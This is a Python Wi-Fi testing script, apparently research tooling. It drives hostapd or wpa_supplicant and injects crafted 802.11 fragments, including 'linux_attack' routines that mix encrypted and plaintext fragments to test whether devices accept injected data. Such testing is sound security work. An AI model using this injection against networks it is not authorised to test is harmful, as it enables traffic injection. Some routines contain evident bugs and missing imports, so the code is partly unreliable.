#!/usr/bin/env python3
from libwifi import *
import abc, sys, socket, struct, time, subprocess, atexit, select
from wpaspy import Ctrl
from scapy.contrib.wpa_eapol import WPA_key

# NOTES:
# - The ath9k_htc devices by default overwrite the injected sequence number.
#   However, this number is not incremented when the MoreFragments flag is set,
#   meaning we can inject fragmented frames (albeit with a different sequence
#   number than then one we use for injection this this script).
# - The above trick does not work when we want to inject other frames between
#   two fragmented frames (the chip will assign them difference sequence numbers).
#   Even when the fragments use a unique QoS TID, sending frames between them
#   will make the chip assign difference sequence numbers to both fragments.
# - Overwriting the sequence can be avoided by patching `ath_tgt_tx_seqno_normal`
#   and commenting out the two lines that modify `i_seq`.
# - See also the comment in Station.inject_next_frags to avoid other bugs with
#   ath9k_htc when injecting frames with the MF flag and while being in AP mode.

#MAC_STA2 = "d0:7e:35:d9:80:91"
#MAC_STA2 = "20:16:b9:b2:73:7a"
MAC_STA2 = "80:5a:04:d4:54:c4"

# ---------- Utility Commands ----------

def wpaspy_clear_messages(ctrl):
	# Clear old replies and messages from the hostapd control interface. This is not
	# perfect and there may be new unrelated messages after executing this code.
	while ctrl.pending():
		ctrl.recv()

def wpaspy_command(ctrl, cmd):
	wpaspy_clear_messages(ctrl)
	rval = ctrl.request(cmd)
	if "UNKNOWN COMMAND" in rval:
		log(ERROR, "wpa_supplicant did not recognize the command %s. Did you (re)compile wpa_supplicant?" % cmd.split()[0])
		quit(1)
	elif "FAIL" in rval:
		log(ERROR, "Failed to execute command %s" % cmd)
		quit(1)
	return rval

def argv_pop_argument(argument):
	if not argument in sys.argv: return False
	idx = sys.argv.index(argument)
	del sys.argv[idx]
	return True


class TestOptions():
	def __init__(self):
		# Workaround for ath9k_htc bugs
		self.inject_workaround = False

		self.interface = None
		self.clientip = None
		self.routerip = None


class MetaFrag():
	# StartingAuth, AfterAuthRace
	# StartAuth: when starting the handshake
	# BeforeAuth: right before last message of the handshake
	# AfterAuth: right after last message of the handshake
	# Connected: 1 second after handshake completed (allows peer to install keys)
	StartAuth, BeforeAuth, AfterAuth, Connected = range(4)

	def __init__(self, frag, trigger, encrypted, inc_pn=1):
		self.frag = frag
		self.trigger = trigger
		self.encrypted = encrypted
		self.inc_pn = inc_pn

class TestCase():
	def __init__(self):
		self.fragments = []
		self.verify = None

	def next_trigger_is(self, trigger):
		if len(self.fragments) == 0:
			return False
		return self.fragments[0].trigger == trigger

	def success_on(self, payload):
		self.verify = payload

	def next(self):
		frag = self.fragments[0]
		del self.fragments[0]
		return frag

class Station():
	def __init__(self, daemon, mac, ds_status):
		self.daemon = daemon
		self.options = daemon.options
		self.txed_before_auth = False
		self.txed_before_auth_done = False
		self.obtained_ip = False

		self.reset_keys()

		# Contains either the "to-DS" or "from-DS" flag.
		self.FCfield = Dot11(FCfield=ds_status).FCfield
		self.seqnum = 1

		# MAC address and IP of the station that our script controls.
		# Can be either an AP or client.
		self.mac = mac
		self.ip = None

		# MAC address and IP of the peer station.
		# Can be either an AP or client.
		self.peermac = None
		self.peerip = None

		# To test frame forwarding to a 3rd party
		self.othermac = None
		self.otherip = None

		self.time_connected = None

	def reset_keys(self):
		self.tk = None
		# TODO: Get the current PN from the kernel, increment by 0x99,
		# and use that to inject packets. Causes less interference.
		# Though perhaps causing interference might be good...
		self.pn = 0x100
		self.gtk = None
		self.gtk_idx = None

	def handle_mon(self, p):
		if not self.obtained_ip: return

	def handle_eth(self, p):
		if not self.obtained_ip: return

		repr(repr(p))

		if self.test.verify and self.test.verify in raw(p):
			log(STATUS, "SUCCESSFULL INJECTION", color="green")
			print(repr(p))

	def send_mon(self, data, prior=1):
		"""
		Right after completing the handshake, it occurred several times that our
		script was sending data *before* the key had been installed (or the port
		authorized). This meant traffic was dropped. Use this function to manually
		send frames over the monitor interface to ensure delivery and encryption.
		"""

		# If it contains an Ethernet header, strip it, and take addresses from that
		p = self.get_header(prior=prior)
		if Ether in data:
			payload = data.payload
			p.addr2 = data.src

			# This tests if to-DS is set
			if p.FCfield & 1:
				p.addr3 = data.dst
			else:
				p.addr1 = data.dst

		else:
			payload = data

		p = p/LLC()/SNAP()/payload
		if self.tk: p = self.encrypt(p)

		print("[Injecting]", repr(p))
		daemon.inject_mon(p)

	def set_header(self, p, forward=False, prior=None):
		"""Set addresses to send frame to the peer or the 3rd party station."""
		# Forward request only makes sense towards the DS/AP
		assert (not forward) or ((p.FCfield & 1) == 0)
		# Priority is only supported in data frames
		assert (prior == None) or (p.type == 2)

		p.FCfield |= self.FCfield
		if prior != None:
			p.subtype = 8
			p.add_payload(Dot11QoS(TID=prior))

		destmac = self.othermac if forward else self.peermac
		p.addr1 = self.peermac
		p.addr2 = self.mac
		# Here p.FCfield & 1 tests if to-DS is set. Then this fields
		# represents the final destination. Otherwise its the BSSID.
		p.addr3 = destmac if p.FCfield & 1 else self.mac

	def get_header(self, seqnum=None, prior=1, **kwargs):
		"""
		Generate a default common header. By default use priority of 1 so destination
		will still accept lower Packet Numbers on other priorities.
		"""

		if seqnum == None:
			seqnum = self.seqnum
			self.seqnum += 1

		header = Dot11(type="Data", SC=(seqnum << 4))
		self.set_header(header, prior=prior, **kwargs)
		return header

	def create_fragments(self, header, data, num_frags):
		data = raw(data)
		fragments = []
		fragsize = (len(data) + 1) // num_frags
		for i in range(num_frags):
			frag = header.copy()
			frag.SC |= i
			if i < num_frags - 1:
				frag.FCfield |= Dot11(FCfield="MF").FCfield

			payload = data[fragsize * i : fragsize * (i + 1)]
			frag = frag/Raw(payload)
			fragments.append(frag)

		return fragments

	def encrypt(self, frame, inc_pn=1):
		key, keyid = (self.tk, 0) if int(frame.addr1[1], 16) & 1 == 0 else (self.gtk, self.gtk_idx)
		encrypted = encrypt_ccmp(frame, key, self.pn, keyid)
		self.pn += inc_pn
		return encrypted

	def generate_test_arpping(self, trigger, num_frags=2):
		header = self.get_header()
		request = LLC()/SNAP()/ARP(op=1, hwsrc=self.mac, psrc=self.ip, hwdst=self.peermac, pdst=self.peerip)
		frags = self.create_fragments(header, request, num_frags)

		test = TestCase()
		for frag in frags:
			test.fragments.append(MetaFrag(frag, trigger, False))

		return test

	def generate_test_ping(self, trigger, num_frags=2, encrypted=True):
		magic = b"generate_test_ping"
		header = self.get_header()
		request = LLC()/SNAP()/IP(src=self.ip, dst=self.peerip)/ICMP()/Raw(magic)
		frags = self.create_fragments(header, request, num_frags)

		test = TestCase()
		for frag in frags:
			test.fragments.append(MetaFrag(frag, trigger, encrypted))
		test.success_on(magic)

		return test

	def generate_test_ping_mixed(self):
		magic = b"generate_test_ping"
		header = self.get_header()
		request = LLC()/SNAP()/IP(src=self.ip, dst=self.peerip)/ICMP()/Raw(magic)
		frag1, frag2 = self.create_fragments(header, request, 2)

		#frag1.addr1 = "ff:ff:ff:ff:ff:ff"
		#frag2.addr1 = "ff:ff:ff:ff:ff:ff"

		test = TestCase()
		test.fragments.append(MetaFrag(frag1, MetaFrag.AfterAuth, False))
		test.fragments.append(MetaFrag(frag2, MetaFrag.AfterAuth, True))
		test.success_on(magic)

		return test

	def generate_linux_attack_ping(self):
		magic = b"generate_test_ping"

		header = self.get_header()
		request = LLC()/SNAP()/IP(src=self.ip, dst=self.peerip)/ICMP()/Raw(magic)
		frag1, frag2 = self.create_fragments(header, request, 2)

		test = TestCase()
		test.fragments.append(MetaFrag(frag1, MetaFrag.AfterAuth, True))

		frag2enc = frag2.copy()
		frag2enc.SC ^= (1 << 4) | 1
		test.fragments.append(MetaFrag(frag2enc, MetaFrag.AfterAuth, True))

		test.fragments.append(MetaFrag(frag2, MetaFrag.AfterAuth, False))

		test.success_on(magic)
		return test

	def generate_test_eapol(self, num_bytes=16, num_frags=1):
		header = self.get_header()
		request = LLC()/SNAP()/EAPOL()/EAP()/Raw(b"A"*32)
		frags = self.create_fragments(header, request, num_frags)

		test = TestCase()
		for frag in frags:
			test.fragments.append(MetaFrag(frag), MetaFrag.StartAuth, False)

		return test

	def generate_test_eapol_debug(self):
		"""Here we manually tweak things for ad-hoc tests"""

		header = self.get_header(prior=2)
		request = LLC()/SNAP()/EAPOL()/EAP()/Raw(b"A"*32)
		frag1, frag2 = self.create_fragments(header, data=request, num_frags=2)

		frag1copy, frag2copy = self.create_fragments(header, data=request, num_frags=2)
		frag1copy.addr1 = "ff:ff:ff:ff:ff:ff"
		frag2copy.addr1 = "ff:ff:ff:ff:ff:ff"

		# To generate the tests we need to know the MAC and IP addresses

		test = TestCase()
		#test.fragments.append(MetaFrag(frag1, MetaFrag.BeforeAuth, False))
		#test.fragments.append(MetaFrag(frag2copy, MetaFrag.BeforeAuth, False))
		#test.fragments.append(MetaFrag(frag2copy, MetaFrag.AfterAuth, False))
		test.fragments.append(MetaFrag(header/LLC()/SNAP()/IP()/ICMP(), MetaFrag.AfterAuth, False))
		#test.fragments.append(MetaFrag(frag2, MetaFrag.AfterAuth, True))

		return test

	def generate_linux_attack(self):
		test = TestCase()
		seqnum = 0xAA

		# Frame 1: encrypted normal fragment
		frag1 = Dot11(type="Data", FCfield="MF", SC=(seqnum << 4) | 0)/Raw(b"A" * 16)
		self.set_header(frag1)
		test.fragments.append(MetaFrag(frag1, MetaFrag.AfterAuth, True))

		# Frame 2: encrypted fragment with different CS but incremental PN.
		#	   sent fragmented to prevent receiving from processing it.
		frag2 = Dot11(type="Data", SC=((seqnum ^ 1) << 4) | 1)/Raw(b"B" * 16)
		self.set_header(frag1)
		test.fragments.append(MetaFrag(frag2, MetaFrag.AfterAuth, True))

		# Frame 3: plaintext fragment with same CS as the first encrypted fragment
		frag3 = Dot11(type="Data", SC=(seqnum << 4) | 1)/Raw(b"C" * 16)
		self.set_header(frag1)
		test.fragments.append(MetaFrag(frag3, MetaFrag.AfterAuth, False))

		return test

	def generate_tests(self):
		#self.test = self.generate_test_arpping(MetaFrag.AfterAuth)
		#self.test = self.generate_test_ping(MetaFrag.AfterAuth, num_frags=1, encrypted=True)
		#self.text = self.generate_test_eapol()
		#self.test = self.generate_test_eapol_debug()
		#self.test = self.generate_linux_attack()
		self.test = TestCase()
		#self.test = self.generate_test_ping_mixed()
		#self.test = self.generate_linux_attack_ping()

		# - Test case to check if the receiver supports interleaved priority
		#   reception. It seems Windows 10 / Intel might not support this.
		# - Test case with a very lage aggregated frame (which is normally not
		#   allowed but some may accept it). And a variation to check how APs
		#   will forward such overly large frame (e.g. force fragmentation).

		# 1. ============================================================
		# 1.1 Encrypted (= sanity ping test)
		# 1.2 Plaintext (= text plaintext injection)
		# 1.3 Encrpted, Encrypted
		# 1.4 [TKIP] Encrpted, Encrypted, no global MIC
		# 1.5 Plaintext, plaintext
		# 1.6 Encrypted, plaintext
		# 1.7 Plaintext, encrypted
		# 1.8 Encrypted, plaintext, encrypted
		# 1.9 Plaintext, encrypted, plaintext
		# 2. Test 2 but first plaintext sent before installing key

		log(STATUS, "Constructed test case", color="green")

	def handle_connecting(self, peermac):
		# If the address was already set, it should not be changing
		assert self.peermac == None or self.peermac == peermac
		self.peermac = peermac

		# Clear the keys on a new connection
		self.reset_keys()

	def inject_next_frags(self, trigger):
		frag = None

		while self.test.next_trigger_is(trigger):
			metafrag = self.test.next()
			if metafrag.encrypted:
				assert self.tk != None and self.gtk != None
				frag = self.encrypt(metafrag.frag, inc_pn=metafrag.inc_pn)
			else:
				frag = metafrag.frag
			self.daemon.inject_mon(frag)
			print("[Injected fragment]", repr(frag))

		# With ath9k_htc devices, there's a bug when injecting a frame with the
		# More Fragments (MF) field *and* operating the interface in AP mode
		# while the target is connected. For some reason, after injecting the
		# frame, it halts the transmission of all other normal frames (this even
		# includes beacons). Injecting a dummy packet like below avoid this,
		# and assures packets keep being sent normally (when the last fragment
		# had the MF flag set).
		#
		# Note: when the device is only operating in monitor mode, this does
		#	not seem to be a problem.
		#
		if self.options.inject_workaround and frag != None and frag.FCfield & 0x4 != 0:
			self.daemon.inject_mon(Dot11(addr1="ff:ff:ff:ff:ff:ff"))
			print("[Injected packet] Prevent ath9k_htc bug after fragment injection")

	def trigger_eapol_events(self, eapol):
		key_type   = eapol.key_info & 0x0008
		key_ack    = eapol.key_info & 0x0080
		key_mic    = eapol.key_info & 0x0100
		key_secure = eapol.key_info & 0x0200
		# Detect Msg3/4 assumig WPA2 is used --- XXX support WPA1 as well
		is_msg3_or_4 = key_secure != 0

		# Inject any fragments before authenticating
		if not self.txed_before_auth:
			log(STATUS, "MetaFrag.StartAuth", color="green")
			self.inject_next_frags(MetaFrag.StartAuth)
			self.txed_before_auth = True
		# Inject any fragments when almost done authenticating
		elif is_msg3_or_4 and not self.txed_before_auth_done:
			log(STATUS, "MetaFrag.BeforeAuth", color="green")
			self.inject_next_frags(MetaFrag.BeforeAuth)
			self.txed_before_auth_done = True

	def handle_eapol_tx(self, eapol):
		eapol = EAPOL(eapol)
		if self.obtained_ip:
			self.trigger_eapol_events(eapol)

		# - Send over monitor interface to assure order compared to injected fragments.
		# - This is also important because the station might have already installed the
		#   key before this script can send the EAPOL frame over Ethernet (but we didn't
		#   yet request the key from this script).
		# - Send with high priority, otherwise MetaFrag.AfterAuth might be send before
		#   the EAPOL frame by the Wi-Fi chip.
		self.send_mon(eapol)

	def handle_authenticated(self):
		"""Called after completion of the 4-way handshake or similar"""
		self.tk = self.daemon.get_tk(self)
		self.gtk, self.gtk_idx = self.daemon.get_gtk()

		if not self.obtained_ip: return

		log(STATUS, "MetaFrag.AfterAuth", color="green")
		self.inject_next_frags(MetaFrag.AfterAuth)

		self.time_connected = time.time() + 1

	def handle_connected(self):
		"""This is called ~1 second after completing the handshake"""
		log(STATUS, "MetaFrag.Connected", color="green")
		self.inject_next_frags(MetaFrag.Connected)

		#self.daemon.rekey(self)

	def set_ip_addresses(self, ip, peerip):
		self.ip = ip
		self.peerip = peerip
		self.obtained_ip = True

		# We can generate tests once we know the IP addresses
		self.generate_tests()

	def time_tick(self):
		# XXX extra check on self.obtained_ip so when the only test is on Connected event,
		#	this test can be run without requiring a reconnect.
		if self.time_connected != None and time.time() > self.time_connected and self.obtained_ip:
			self.handle_connected()
			self.time_connected = None

class Daemon():
	def __init__(self, options):
		self.options = options

		# Note: some kernels don't support interface names of 15+ characters
		self.nic_iface = options.interface
		self.nic_mon = "mon" + self.nic_iface[:12]

		self.process = None
		self.sock_eth = None
		self.sock_mon = None

	@abc.abstractmethod
	def start_daemon(self):
		pass

	def configure_daemon(self):
		pass

	def handle_mon(self, p):
		pass

	def handle_eth(self, p):
		pass

	@abc.abstractmethod
	def time_tick(self, station):
		pass

	@abc.abstractmethod
	def get_tk(self, station):
		pass

	def get_gtk(self):
		gtk, idx = wpaspy_command(self.wpaspy_ctrl, "GET_GTK").split()
		return bytes.fromhex(gtk), int(idx)

	@abc.abstractmethod
	def rekey(self, station):
		pass

	# TODO: Might be good to put this into libwifi?
	def configure_interfaces(self):
		log(STATUS, "Note: disable Wi-Fi in your network manager so it doesn't interfere with this script")

		# 0. Some users may forget this otherwise
		subprocess.check_output(["rfkill", "unblock", "wifi"])

		# 1. Only create a new monitor interface if it does not yet exist
		try:
			scapy.arch.get_if_index(self.nic_mon)
		except IOError:
			subprocess.call(["iw", self.nic_mon, "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
			subprocess.check_output(["iw", self.nic_iface, "interface", "add", self.nic_mon, "type", "monitor"])

		# 2. Configure monitor mode on interfaces
		# Some kernels (Debian jessie - 3.16.0-4-amd64) don't properly add the monitor interface. The following ugly
		# sequence of commands assures the virtual interface is properly registered as a 802.11 monitor interface.
		subprocess.check_output(["iw", self.nic_mon, "set", "type", "monitor"])
		time.sleep(0.5)
		subprocess.check_output(["iw", self.nic_mon, "set", "type", "monitor"])
		subprocess.check_output(["ifconfig", self.nic_mon, "up"])

		# 3. Remember whether to need to perform a workaround.
		driver = get_device_driver(self.nic_iface)
		if driver == None:
			log(WARNING, "Unable to detect driver of interface!")
			log(WARNING, "Injecting fragments may contains bugs.")
		elif driver == "ath9k_htc":
			options.inject_workaround = True
			log(STATUS, "Detect ath9k_htc, using injection bug workarounds")

	def inject_mon(self, p):
		self.sock_mon.send(p)

	def inject_eth(self, p):
		self.sock_eth.send(p)

	def run(self):
		self.configure_interfaces()
		self.start_daemon()
		self.sock_mon = MonitorSocket(type=ETH_P_ALL, iface=self.nic_mon)
		self.sock_eth = L2Socket(type=ETH_P_ALL, iface=self.nic_iface)

		# Open the wpa_supplicant or hostapd control interface
		try:
			self.wpaspy_ctrl = Ctrl("wpaspy_ctrl/" + self.nic_iface)
			self.wpaspy_ctrl.attach()
		except:
			log(ERROR, "It seems wpa_supplicant/hostapd did not start properly, please inspect its output.")
			log(ERROR, "Did you disable Wi-Fi in the network manager? Otherwise it won't start properly.")
			raise

		# Post-startup configuration of the supplicant or AP
		self.configure_daemon()

		# Monitor the virtual monitor interface of the client and perform the needed actions
		while True:
			sel = select.select([self.sock_mon, self.sock_eth, self.wpaspy_ctrl.s], [], [], 0.5)
			if self.sock_mon in sel[0]:
				p = self.sock_mon.recv()
				if p != None: self.handle_mon(p)

			if self.sock_eth in sel[0]:
				p = self.sock_eth.recv()
				if p != None and Ether in p: self.handle_eth(p)

			if self.wpaspy_ctrl.s in sel[0]:
				msg = self.wpaspy_ctrl.recv()
				self.handle_wpaspy(msg)

			self.time_tick()

	def stop(self):
		log(STATUS, "Closing Hostap daemon and cleaning up ...")
		if self.process:
			self.process.terminate()
			self.process.wait()
		if self.sock_eth: self.sock_eth.close()
		if self.sock_mon: self.sock_mon.close()


class Authenticator(Daemon):
	def __init__(self, options):
		super().__init__(options)

		self.apmac = None
		self.sock_eth = None
		self.dhcp = None
		self.arp_sender_ip = None
		self.arp_sock = None
		self.stations = dict()

	def get_tk(self, station):
		tk = wpaspy_command(self.wpaspy_ctrl, "GET_TK " + station.peermac)
		return bytes.fromhex(tk)

	def time_tick(self):
		for station in self.stations.values():
			station.time_tick()

	def rekey(self, station):
		wpaspy_command(self.wpaspy_ctrl, "REKEY_PTK " + station.peermac)

	def force_reconnect(self, station):
		# Confirmed to *instantly* reconnect: Arch Linux, Windows 10 with Intel WiFi chip, iPad Pro 13.3.1
		# Reconnects only after a few seconds: MacOS (same with other reasons and with deauthentication)
		cmd = "DISASSOCIATE %s reason=%d" % (station.peermac, WLAN_REASON_CLASS3_FRAME_FROM_NONASSOC_STA)
		wpaspy_command(self.wpaspy_ctrl, cmd)

	def handle_eth_dhcp(self, p, station):
		if not DHCP in p or not station.peermac in self.dhcp.leases: return

		# This assures we only mark it was connected after receiving a DHCP Request
		req_type = next(opt[1] for opt in p[DHCP].options if isinstance(opt, tuple) and opt[0] == 'message-type')
		if req_type != 3: return

		peerip = self.dhcp.leases[station.peermac]
		log(STATUS, "Client %s with IP %s has connected" % (station.peermac, peerip))
		station.set_ip_addresses(self.arp_sender_ip, peerip)
		self.force_reconnect(station)

	def handle_eth(self, p):
		# Ignore clients not connected to the AP
		clientmac = p[Ether].src
		if not clientmac in self.stations:
			return

		# Let clients get IP addresses
		self.dhcp.reply(p)
		self.arp_sock.reply(p)

		# Monitor DHCP messages to know when a client received an IP address
		station = self.stations[clientmac]
		if not station.obtained_ip:
			self.handle_eth_dhcp(p, station)
		else:
			station.handle_eth(p)

	def handle_wpaspy(self, msg):
		log(STATUS, "daemon: " + msg)

		if "AP-STA-CONNECTING" in msg:
			cmd, clientmac = msg.split()
			if not clientmac in self.stations:
				station = Station(self, self.apmac, "from-DS")
				self.stations[clientmac] = station

			log(STATUS, "Client %s is connecting" % clientmac)
			station = self.stations[clientmac]
			station.handle_connecting(clientmac)

		elif "EAPOL-TX" in msg:
			cmd, clientmac, payload = msg.split()
			if not clientmac in self.stations:
				log(WARNING, "Sending EAPOL to unknown client %s." % clientmac)
				return
			self.stations[clientmac].handle_eapol_tx(bytes.fromhex(payload))

		elif "AP-STA-CONNECTED" in msg:
			cmd, clientmac = msg.split()
			if not clientmac in self.stations:
				log(WARNING, "Unknown client %s finished authenticating." % clientmac)
				return
			self.stations[clientmac].handle_authenticated()

	def start_daemon(self):
		log(STATUS, "Starting hostapd ...")
		try:
			self.process = subprocess.Popen([
				"../hostapd/hostapd",
				"-i", self.nic_iface,
				"hostapd.conf", "-dd"
			])
			time.sleep(1)
		except:
			if not os.path.exists("../hostapd/hostapd"):
				log(ERROR, "hostapd executable not found. Did you compile hostapd?")
			raise

		self.apmac = scapy.arch.get_if_hwaddr(self.nic_iface)

	def configure_daemon(self):
		# Intercept EAPOL packets that the client wants to send
		wpaspy_command(self.wpaspy_ctrl, "SET ext_eapol_frame_io 1")

		# Let scapy handle DHCP requests
		self.dhcp = DHCP_sock(sock=self.sock_eth,
						domain='mathyvanhoef.com',
						pool=Net('192.168.100.0/24'),
						network='192.168.100.0/24',
						gw='192.168.100.254',
						renewal_time=600, lease_time=3600)
		# Configure gateway IP: reply to ARP and ping requests
		subprocess.check_output(["ifconfig", self.nic_iface, "192.168.100.254"])

		# Use a dedicated IP address for our ARP ping and replies
		self.arp_sender_ip = self.dhcp.pool.pop()
		self.arp_sock = ARP_sock(sock=self.sock_eth, IP_addr=self.arp_sender_ip, ARP_addr=self.apmac)
		log(STATUS, "Will inject ARP packets using sender IP %s" % self.arp_sender_ip)


class Supplicant(Daemon):
	def __init__(self, options):
		super().__init__(options)
		self.station = None
		self.arp_sock = None
		self.time_dhcp_discover = None

	def get_tk(self, station):
		tk = wpaspy_command(self.wpaspy_ctrl, "GET tk")
		if tk == "none":
			raise Exception("Couldn't retrieve session key of client")
		else:
			return bytes.fromhex(tk)

	def rekey(self, station):
		# WAG320N: does not work (Broadcom - no reply)
		# MediaTek: starts handshake. But must send Msg2/4 in plaintext! Request optionally in plaintext.
		# RT-N10: we get a deauthentication as a reply. Connection is killed.
		# LANCOM: does not work (no reply)
		# Aruba: TODO
		# ==> Only reliable way is to configure AP to constantly rekey the PTK, and wait
		#     untill the AP starts a rekey.
		#wpaspy_command(self.wpaspy_ctrl, "KEY_REQUEST 0 1")

		log(ERROR, "Supplicant.rekey() was found to be unreliable and shouldn't be used.")
		quit(1)

	def time_tick(self):
		self.station.time_tick()

		if self.time_dhcp_discover != None and time.time() > self.time_dhcp_discover:
			# TODO: Create a timer in case retransmissions are needed
			self.send_dhcp_discover()
			self.time_dhcp_discover = None

	def send_dhcp_discover(self):
		rawmac = bytes.fromhex(self.station.mac.replace(':', ''))
		req = Ether(dst="ff:ff:ff:ff:ff:ff", src=self.station.mac)/IP(src="0.0.0.0", dst="255.255.255.255")
		req = req/UDP(sport=68, dport=67)/BOOTP(op=1, chaddr=rawmac, xid=1337)
		req = req/DHCP(options=[("message-type", "discover"), "end"])
		print(repr(req))

		self.station.send_mon(req)
		#self.sock_eth.send(req)

	def send_dhcp_request(self, offer):
		rawmac = bytes.fromhex(self.station.mac.replace(':', ''))
		myip = offer[BOOTP].yiaddr
		sip = offer[BOOTP].siaddr
		xid = offer[BOOTP].xid

		reply = Ether(dst="ff:ff:ff:ff:ff:ff", src=self.station.mac)/IP(src="0.0.0.0", dst="255.255.255.255")
		reply = reply/UDP(sport=68, dport=67)/BOOTP(op=1, chaddr=rawmac, xid=1337)
		reply = reply/DHCP(options=[("message-type", "request"), ("requested_addr", myip),
					    ("hostname", "fragclient"), "end"])

		self.station.send_mon(reply)
		#self.sock_eth.send(reply)

	def handle_eth_dhcp(self, p):
		"""Handle packets needed to connect and request an IP"""
		if not DHCP in p: return

		req_type = next(opt[1] for opt in p[DHCP].options if isinstance(opt, tuple) and opt[0] == 'message-type')

		# DHCP Offer
		if req_type == 2:
			log(STATUS, "Received DHCP offer, sending DHCP request.")
			self.send_dhcp_request(p)

		# DHCP Ack
		elif req_type == 5:
			clientip = p[BOOTP].yiaddr
			serverip = p[IP].src
			log(STATUS, "Received DHCP ack. My ip is %s and router is %s." % (clientip, serverip))

			self.initialize_ips(clientip, serverip)
			self.reconnect()

	def initialize_ips(self, clientip, serverip):
		self.station.set_ip_addresses(clientip, serverip)
		self.arp_sock = ARP_sock(sock=self.sock_eth, IP_addr=self.station.ip, ARP_addr=self.station.mac)

	def handle_eth(self, p):
		if not self.station.obtained_ip:
			self.handle_eth_dhcp(p)
		else:
			self.arp_sock.reply(p)
			self.station.handle_eth(p)

	def handle_wpaspy(self, msg):
		log(STATUS, "daemon: " + msg)

		if "CTRL-EVENT-CONNECTED" in msg:
			# This get's the current keys
			self.station.handle_authenticated()

			if not self.station.obtained_ip:
				self.time_dhcp_discover = time.time() + 0.5

		# Trying to authenticate with 38:2c:4a:c1:69:bc (SSID='backupnetwork2' freq=2462 MHz)
		elif "Trying to authenticate with" in msg:
			p = re.compile("Trying to authenticate with (.*) \(SSID")
			peermac = p.search(msg).group(1)
			self.station.handle_connecting(peermac)

		elif "EAPOL-TX" in msg:
			cmd, srcaddr, payload = msg.split()
			self.station.handle_eapol_tx(bytes.fromhex(payload))

	def reconnect(self):
		# TODO: Check that ROAM command always performs a deauthentication
		log(STATUS, "Reconnecting to the AP.", color="green")
		wpaspy_command(self.wpaspy_ctrl, "SET ext_eapol_frame_io 1")
		wpaspy_command(self.wpaspy_ctrl, "ROAM " + self.station.peermac)

	def configure_daemon(self):
		# TODO: Only enable networks once our script is ready, to prevent
		#	wpa_supplicant from connecting before our start started.

		# If the user already supplied IPs we can immediately perform tests
		if self.options.clientip and self.options.routerip:
			self.initialize_ips(self.options.clientip, self.options.routerip)
			wpaspy_command(self.wpaspy_ctrl, "SET ext_eapol_frame_io 1")

	def start_daemon(self):
		log(STATUS, "Starting wpa_supplicant ...")
		try:
			self.process = subprocess.Popen([
				"../wpa_supplicant/wpa_supplicant",
				"-Dnl80211",
				"-i", self.nic_iface,
				"-cclient.conf",
				"-dd"])
			time.sleep(1)
		except:
			if not os.path.exists("../wpa_supplicant/wpa_supplicant"):
				log(ERROR, "wpa_supplicant executable not found. Did you compile wpa_supplicant?")
			raise

		clientmac = scapy.arch.get_if_hwaddr(self.nic_iface)
		self.station = Station(self, clientmac, "to-DS")


def cleanup():
	daemon.stop()


if __name__ == "__main__":
	if "--help" in sys.argv or "-h" in sys.argv:
		print("\nSee README.md for usage instructions.")
		quit(1)

	options = TestOptions()
	options.interface = sys.argv[1]

	# Parse remaining options
	start_ap = argv_pop_argument("--ap")
	while argv_pop_argument("--debug"):
		libwifi.global_log_level -= 1

	# Now start the tests
	if start_ap:
		daemon = Authenticator(options)
	else:
		daemon = Supplicant(options)
	atexit.register(cleanup)
	daemon.run()

